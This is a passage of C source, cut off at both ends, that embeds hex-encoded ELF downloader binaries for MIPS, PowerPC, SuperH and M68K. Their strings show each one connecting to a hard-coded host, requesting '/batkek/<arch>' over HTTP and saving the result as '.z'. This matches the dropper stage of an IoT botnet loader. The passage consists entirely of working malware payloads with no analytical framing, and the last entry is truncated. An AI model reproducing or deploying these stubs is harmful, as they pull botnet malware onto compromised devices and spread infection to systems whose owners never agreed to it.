x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x40\x00\xa0\x00\x00\x00\xa0\x00\x00\x04\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x40\x05\x20\x00\x00\x05\x20\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x10\x00\x00\x03\x00\x44\x05\x50\x00\x00\x05\x50\x00\x00\x00\x4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x44\x05\xa0\x00\x00\x05\x9c\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x05\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x9c\x00\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1768, 0 },
    { ARCH_MIPS,   ENDIAN_LITTLE,  "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x01\x00\x00\x00\xe8\x01\x40\x00\x34\x00\x00\x00\xd0\x05\x00\x00\x07\x10\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x4c\x05\x00\x00\x4c\x05\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x50\x05\x00\x00\x50\x05\x44\x00\x50\x05\x44\x00\x4c\x00\x00\x00\x60\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\xa0\x84\x9c\x27\x21\xe0\x99\x03\x54\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa1\x0f\x04\x24\x05\x00\x1c\x3c\x84\x84\x9c\x27\x21\xe0\x99\x03\x54\x80\x99\x8f\x21\x28\x80\x00\x08\x00\x20\x03\xa6\x0f\x04\x24\x05\x00\x1c\x3c\x68\x84\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x54\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa5\x0f\x04\x24\x05\x00\x1c\x3c\x40\x84\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x54\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x03\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\xf4\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x54\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa4\x0f\x04\x24\x05\x00\x1c\x3c\xcc\x83\x9c\x27\x21\xe0\x99\x03\x21\x10\xa0\x00\x54\x80\x99\x8f\x21\x38\xc0\x00\x21\x28\x80\x00\x21\x30\x40\x00\x08\x00\x20\x03\xa3\x0f\x04\x24\x05\x00\x1c\x3c\xa4\x83\x9c\x27\x21\xe0\x99\x03\xd0\xff\xbd\x27\x28\x00\xbf\xaf\x10\x00\xbc\xaf\x54\x80\x99\x8f\x18\x00\xa4\xaf\x1c\x00\xa5\xaf\x20\x00\xa6\xaf\x06\x10\x04\x24\x18\x00\xa6\x27\x09\xf8\x20\x03\x01\x00\x05\x24\x10\x00\xbc\x8f\x28\x00\xbf\x8f\x00\x00\x00\x00\x08\x00\xe0\x03\x30\x00\xbd\x27\x05\x00\x1c\x3c\x58\x83\x9c\x27\x21\xe0\x99\x03\x40\xff\xbd\x27\xbc\x00\xbf\xaf\xb8\x00\xb2\xaf\xb4\x00\xb1\xaf\xb0\x00\xb0\xaf\x10\x00\xbc\xaf\x21\x00\xe0\x03\x01\x00\x11\x04\x00\x00\x00\x00\x05\x00\x1c\x3c\x28\x83\x9c\x27\x21\xe0\x9f\x03\x21\xf8\x00\x00\x18\x80\x82\x8f\x00\x00\x00\x00\x20\x05\x50\x24\x00\x00\x02\x82\x00\x00\x00\x00\xfd\xff\x40\x14\x01\x00\x10\x26\xff\xff\x10\x26\x02\x00\x02\x24\x1c\x00\xa2\xa7\x00\x50\x02\x24\x1e\x00\xa2\xa7\xc4\x7e\x02\x3c\x45\x1e\x42\x34\x18\x80\x84\x8f\x20\x00\xa2\xaf\x18\x80\x82\x8f\x58\x80\x99\x8f\x28\x05\x84\x24\x01\x03\x05\x24\xff\x01\x06\x24\x20\x05\x42\x24\x09\xf8\x20\x03\x23\x80\x02\x02\x10\x00\xbc\x8f\x02\x00\x04\x24\x48\x80\x99\x8f\x02\x00\x05\x24\x21\x30\x00\x00\x09\xf8\x20\x03\x21\x90\x40\x00\x21\x88\x40\x00\xff\xff\x02\x24\x10\x00\xbc\x8f\x03\x00\x22\x12\x00\x00\x00\x00\x07\x00\x42\x16\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x01\x00\x04\x24\x10\x00\xbc\x8f\x00\x00\x00\x00\x40\x80\x99\x8f\x21\x20\x20\x02\x1c\x00\xa5\x27\x09\xf8\x20\x03\x10\x00\x06\x24\x10\x00\xbc\x8f\x07\x00\x41\x04\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x23\x20\x02\x00\x10\x00\xbc\x8f\x00\x00\x00\x00\x18\x80\x85\x8f\x44\x80\x99\x8f\x19\x00\x10\x26\x2c\x05\xa5\x24\x21\x20\x20\x02\x09\xf8\x20\x03\x21\x30\x00\x02\x10\x00\xbc\x8f\x07\x00\x50\x10\x21\x80\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x03\x00\x04\x24\x10\x00\xbc\x8f\x21\x80\x00\x00\x38\x80\x99\x8f\x21\x20\x20\x02\x18\x00\xa5\x27\x09\xf8\x20\x03\x01\x00\x06\x24\x10\x00\xbc\x8f\x01\x00\x03\x24\x4c\x80\x99\x8f\x04\x00\x43\x10\x04\x00\x04\x24\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\x18\x00\xa3\x83\x00\x12\x10\x00\x25\x80\x43\x00\x0a\x0d\x02\x3c\x0a\x0d\x42\x34\xed\xff\x02\x16\x00\x00\x00\x00\x38\x80\x99\x8f\x2c\x00\xb0\x27\x21\x20\x20\x02\x21\x28\x00\x02\x09\xf8\x20\x03\x80\x00\x06\x24\x10\x00\xbc\x8f\x21\x28\x00\x02\x44\x80\x99\x8f\x21\x30\x40\x00\x06\x00\x40\x18\x21\x20\x40\x02\x09\xf8\x20\x03\x00\x00\x00\x00\x10\x00\xbc\x8f\xf0\xff\x00\x10\x00\x00\x00\x00\x50\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x20\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x50\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x20\x40\x02\x10\x00\xbc\x8f\x00\x00\x00\x00\x4c\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x05\x00\x04\x24\x10\x00\xbc\x8f\xbc\x00\xbf\x8f\xb8\x00\xb2\x8f\xb4\x00\xb1\x8f\xb0\x00\xb0\x8f\x08\x00\xe0\x03\xc0\x00\xbd\x27\x05\x00\x1c\x3c\x00\x81\x9c\x27\x21\xe0\x99\x03\x21\x10\x80\x00\x21\x20\xa0\x00\x21\x28\xc0\x00\x21\x30\xe0\x00\x10\x00\xa7\x8f\x14\x00\xa8\x8f\x18\x00\xa9\x8f\x1c\x00\xaa\x8f\xe0\xff\xbd\x27\x10\x00\xa8\xaf\x14\x00\xa9\xaf\x18\x00\xaa\xaf\x1c\x00\xa2\xaf\x1c\x00\xa2\x8f\x0c\x00\x00\x00\x03\x00\xe0\x14\x20\x00\xbd\x27\x08\x00\xe0\x03\x00\x00\x00\x00\x21\x20\x40\x00\x3c\x80\x99\x8f\x00\x00\x00\x00\x08\x00\x20\x03\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x90\x80\x9c\x27\x21\xe0\x99\x03\xe0\xff\xbd\x27\x1c\x00\xbf\xaf\x18\x00\xb0\xaf\x10\x00\xbc\xaf\x34\x80\x99\x8f\x00\x00\x00\x00\x09\xf8\x20\x03\x21\x80\x80\x00\x10\x00\xbc\x8f\x00\x00\x50\xac\x1c\x00\xbf\x8f\x18\x00\xb0\x8f\xff\xff\x02\x24\x08\x00\xe0\x03\x20\x00\xbd\x27\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x1c\x3c\x40\x80\x9c\x27\x21\xe0\x99\x03\x30\x80\x82\x8f\x08\x00\xe0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6d\x69\x70\x73\x65\x6c\x00\x00\x2e\x7a\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x6d\x69\x70\x73\x65\x6c\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x05\x44\x00\x00\x05\x40\x00\x74\x01\x40\x00\xb0\x04\x40\x00\x00\x01\x40\x00\x4c\x01\x40\x00\x9c\x01\x40\x00\xa0\x00\x40\x00\xbc\x00\x40\x00\x40\x04\x40\x00\xd8\x00\x40\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xa0\x00\x40\x00\xa0\x00\x00\x00\x80\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x20\x05\x40\x00\x20\x05\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x10\x50\x05\x44\x00\x50\x05\x00\x00\x4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xa0\x05\x44\x00\x9c\x05\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x9c\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9c\x05\x00\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1768, 0 },
    { ARCH_PPC,    ENDIAN_BIG,     "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x14\x00\x00\x00\x01\x10\x00\x02\x0c\x00\x00\x00\x34\x00\x00\x04\x38\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00\x04\x18\x00\x00\x04\x18\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x04\x18\x10\x01\x04\x18\x10\x01\x04\x18\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\x64\x1b\x78\x38\x60\x00\x01\x90\x01\x00\x14\x4c\xc6\x31\x82\x48\x00\x02\xd9\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\x64\x1b\x78\x38\x60\x00\x06\x90\x01\x00\x14\x4c\xc6\x31\x82\x48\x00\x02\xad\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x05\x4c\xc6\x31\x82\x48\x00\x02\x75\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\xe0\x7c\x08\x02\xa6\x90\x61\x00\x08\x38\x60\x00\x66\x90\x81\x00\x0c\x38\x80\x00\x03\x90\xa1\x00\x10\x38\xa1\x00\x08\x90\x01\x00\x24\x4c\xc6\x31\x82\x48\x00\x02\x39\x80\x01\x00\x24\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x04\x4c\xc6\x31\x82\x48\x00\x02\x01\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x08\x02\xa6\x94\x21\xff\xf0\x7c\xa6\x2b\x78\x90\x01\x00\x14\x7c\x80\x23\x78\x7c\x05\x03\x78\x7c\x64\x1b\x78\x38\x60\x00\x03\x4c\xc6\x31\x82\x48\x00\x01\xc9\x80\x01\x00\x14\x38\x21\x00\x10\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\xe0\x7c\x08\x02\xa6\x90\x61\x00\x08\x38\x60\x00\x66\x90\x81\x00\x0c\x38\x80\x00\x01\x90\xa1\x00\x10\x38\xa1\x00\x08\x90\x01\x00\x24\x4c\xc6\x31\x82\x48\x00\x01\x8d\x80\x01\x00\x24\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x94\x21\xff\x40\x7c\x08\x02\xa6\x3d\x20\x10\x00\xbf\xa1\x00\xb4\x3b\xa9\x03\xe8\x90\x01\x00\xc4\x48\x00\x00\x08\x3b\xbd\x00\x01\x88\x1d\x00\x00\x2f\x80\x00\x00\x40\x9e\xff\xf4\x38\x00\x00\x02\x3d\x60\x45\x1e\x3c\x60\x10\x00\x3d\x20\x10\x00\x61\x6b\xc4\x7e\x39\x29\x03\xe8\x38\x80\x02\x41\x38\xa0\x01\xff\xb0\x01\x00\x0c\x38\x63\x03\xf0\x38\x00\x00\x50\x7f\xa9\xe8\x50\xb0\x01\x00\x0e\x91\x61\x00\x10\x4b\xff\xfe\x7d\x7c\x7e\x1b\x78\x38\x80\x00\x01\x38\x60\x00\x02\x38\xa0\x00\x00\x4b\xff\xff\x4d\x2f\x83\xff\xff\x7c\x7f\x1b\x78\x41\x9e\x00\x0c\x2f\x9e\xff\xff\x40\xbe\x00\x0c\x38\x60\x00\x01\x4b\xff\xfd\xf5\x7f\xe3\xfb\x78\x38\x81\x00\x0c\x38\xa0\x00\x10\x4b\xff\xfe\x75\x2c\x03\x00\x00\x40\xa0\x00\x0c\x7c\x63\x00\xd0\x4b\xff\xfd\xd5\x3b\xbd\x00\x19\x3c\x80\x10\x00\x38\x84\x03\xf4\x7f\xe3\xfb\x78\x7f\xa5\xeb\x78\x4b\xff\xfe\x89\x7f\x83\xe8\x00\x41\x9e\x00\x0c\x38\x60\x00\x03\x4b\xff\xfd\xad\x3b\xa0\x00\x00\x38\x81\x00\x08\x38\xa0\x00\x01\x7f\xe3\xfb\x78\x4b\xff\xfe\x9d\x2f\x83\x00\x01\x38\x60\x00\x04\x41\x9e\x00\x08\x4b\xff\xfd\x89\x89\x61\x00\x08\x57\xa9\x40\x2e\x3c\x00\x0d\x0a\x7d\x3d\x5b\x78\x60\x00\x0d\x0a\x7f\x9d\x00\x00\x40\x9e\xff\xc8\x3b\xa1\x00\x1c\x38\xa0\x00\x80\x7f\xa4\xeb\x78\x7f\xe3\xfb\x78\x4b\xff\xfe\x5d\x7f\xa4\xeb\x78\x7c\x65\x1b\x79\x7f\xc3\xf3\x78\x40\x81\x00\x0c\x4b\xff\xfe\x11\x4b\xff\xff\xd8\x7f\xe3\xfb\x78\x4b\xff\xfd\x65\x7f\xc3\xf3\x78\x4b\xff\xfd\x5d\x38\x60\x00\x05\x4b\xff\xfd\x29\x80\x01\x00\xc4\xbb\xa1\x00\xb4\x38\x21\x00\xc0\x7c\x08\x03\xa6\x4e\x80\x00\x20\x7c\x60\x1b\x78\x7c\x83\x23\x78\x7c\xa4\x2b\x78\x7c\xc5\x33\x78\x7c\xe6\x3b\x78\x7d\x07\x43\x78\x44\x00\x00\x02\x4c\x83\x00\x20\x48\x00\x00\x04\x7c\x08\x02\xa6\x94\x21\xff\xe0\xbf\xa1\x00\x14\x7c\x7d\x1b\x78\x90\x01\x00\x24\x48\x00\x00\x21\x93\xa3\x00\x00\x38\x60\xff\xff\x80\x01\x00\x24\xbb\xa1\x00\x14\x38\x21\x00\x20\x7c\x08\x03\xa6\x4e\x80\x00\x20\x3c\x60\x10\x01\x38\x63\x04\x18\x4e\x80\x00\x20\x70\x6f\x77\x65\x72\x70\x63\x00\x2e\x7a\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x70\x6f\x77\x65\x72\x70\x63\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x73\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x10\x00\x00\x94\x00\x00\x00\x94\x00\x00\x03\x54\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x10\x00\x03\xe8\x00\x00\x03\xe8\x00\x00\x00\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x10\x01\x04\x18\x00\x00\x04\x18\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x18\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00", 1280, 0 },
    { ARCH_SUPERH, ENDIAN_LITTLE,  "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x2a\x00\x01\x00\x00\x00\x68\x01\x40\x00\x34\x00\x00\x00\x30\x03\x00\x00\x02\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x10\x03\x00\x00\x10\x03\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x01\x00\x00\x00\x10\x03\x00\x00\x10\x03\x41\x00\x10\x03\x41\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x00\x01\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x04\xd1\x43\x65\xe6\x2f\x01\xe4\xf3\x6e\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x09\x00\x98\x02\x40\x00\x04\xd1\x43\x65\xe6\x2f\x06\xe4\xf3\x6e\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x09\x00\x98\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x05\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x98\x02\x40\x00\xe6\x2f\x22\x4f\x07\xd0\xf4\x7f\xf3\x6e\x42\x2e\x51\x1e\x66\xe4\x62\x1e\x03\xe5\x0b\x40\xe3\x66\x0c\x7e\xe3\x6f\x26\x4f\xf6\x6e\x0b\x00\x09\x00\x98\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x04\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x98\x02\x40\x00\x53\x61\x63\x67\x13\x66\x04\xd1\xe6\x2f\x43\x65\xf3\x6e\x03\xe4\xe3\x6f\xf6\x6e\x2b\x41\x09\x00\x98\x02\x40\x00\xe6\x2f\x22\x4f\x07\xd0\xf4\x7f\xf3\x6e\x42\x2e\x51\x1e\x66\xe4\x62\x1e\x01\xe5\x0b\x40\xe3\x66\x0c\x7e\xe3\x6f\x26\x4f\xf6\x6e\x0b\x00\x09\x00\x98\x02\x40\x00\x86\x2f\x96\x2f\xa6\x2f\xb6\x2f\xe6\x2f\x22\x4f\x3c\xd8\xb4\x7f\xb8\x7f\xf3\x6e\x80\x61\x18\x21\xfc\x8f\x01\x78\xff\x78\x38\xd1\x68\x92\x68\x90\x18\x38\x67\x93\x36\xd1\x25\x0e\xec\x33\x36\xd0\x11\x13\x02\xe1\x35\xd4\x60\x95\x60\x96\x0b\x40\x11\x23\x03\x6b\x33\xd0\x02\xe4\x01\xe5\x0b\x40\x00\xe6\xff\x88\x03\x8d\x03\x69\xb3\x60\xff\x88\x02\x8b\x2f\xd1\x0b\x41\x01\xe4\x2e\xd0\x93\x64\x4a\x95\x10\xe6\x0b\x40\xec\x35\x11\x40\x02\x89\x29\xd1\x0b\x41\x0b\x64\x2a\xd0\x19\x78\x93\x64\x29\xd5\x0b\x40\x83\x66\x80\x30\x02\x89\x24\xd1\x0b\x41\x03\xe4\x00\xe8\x38\x9a\x93\x64\x25\xd0\x01\xe6\xec\x3a\xa3\x65\x0b\x40\x18\x48\x01\x88\x03\x8d\x04\xe4\x1c\xd1\x0b\x41\x09\x00\xa0\x61\x1b\x28\x1f\xd1\x10\x38\xec\x8b\x1c\xd0\x93\x64\x20\x96\x0b\x40\xe3\x65\x15\x40\xe3\x65\x03\x66\x05\x8f\xb3\x64\x15\xd0\x0b\x40\x09\x00\xf1\xaf\x09\x00\x17\xd8\x0b\x48\x93\x64\x0b\x48\xb3\x64\x0e\xd1\x0b\x41\x05\xe4\x48\x7e\x4c\x7e\xe3\x6f\x26\x4f\xf6\x6e\xf6\x6b\xf6\x6a\xf6\x69\xf6\x68\x0b\x00\x09\x00\x00\x50\x82\x00\x80\x00\x41\x02\xff\x01\x93\x00\xe8\x02\x40\x00\x45\x1e\xc4\x7e\xc4\x00\x40\x00\xec\x02\x40\x00\x40\x01\x40\x00\x94\x00\x40\x00\xe0\x00\x40\x00\x08\x01\x40\x00\xf0\x02\x40\x00\x24\x01\x40\x00\x0a\x0d\x0a\x0d\xac\x00\x40\x00\x86\x2f\x43\x63\xe6\x2f\x53\x64\x22\x4f\x63\x65\xf3\x6e\x73\x66\xe4\x50\xe3\x57\xe5\x51\x16\xc3\x82\xe1\x16\x30\x06\x8f\x03\x68\x05\xd0\x0b\x40\x09\x00\x8b\x61\x12\x20\xff\xe0\xe3\x6f\x26\x4f\xf6\x6e\xf6\x68\x0b\x00\x09\x00\xd4\x02\x40\x00\x03\xd0\xe6\x2f\xf3\x6e\xe3\x6f\xf6\x6e\x0b\x00\x09\x00\x09\x00\x10\x03\x41\x00\x73\x68\x34\x00\x2e\x7a\x00\x00\x47\x45\x54\x20\x2f\x62\x61\x74\x6b\x65\x6b\x2f\x73\x68\x34\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x94\x00\x40\x00\x94\x00\x00\x00\x54\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xe8\x02\x40\x00\xe8\x02\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x10\x03\x41\x00\x10\x03\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x03\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1016,  0 },
    { ARCH_M68K,   ENDIAN_BIG,     "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x04\x00\x00\x00\x01\x80\x00\x01\x74\x00\x00\x00\x34\x00\x00\x03\x78\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\x00\x00\x00\x03\x56\x00\x00\x03\x56\x00\x00\x00\x05\x00\x00\x20\x00\x00\x00\x00\x01\x00\x00\x03\x58\x80\x00\x23\x58\x80\x00\x23\x58\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x20\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x4e\x56\x00\x00\x2f\x2e\x00\x08\x48\x78\x00\x01\x61\xff\x00\x00\x02\x22\x50\x8f\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x08\x48\x78\x00\x06\x61\xff\x00\x00\x02\x0a\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x05\x61\xff\x00\x00\x01\xec\x4e\x5e\x4e\x75\x4e\x56\xff\xf4\x2d\x6e\x00\x08\xff\xf4\x2d\x6e\x00\x0c\xff\xf8\x2d\x6e\x00\x10\xff\xfc\x48\x6e\xff\xf4\x48\x78\x00\x03\x48\x78\x00\x66\x61\xff\x00\x00\x01\xc0\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x08\x48\x78\x00\x04\x61\xff\x00\x00\x01\xa2\x4e\x5e\x4e\x75\x4e\x56\x00\x00\x2f\x2e\x00\x10\x2f\x2e\x00\x0c\x2f\x2e\x00\x0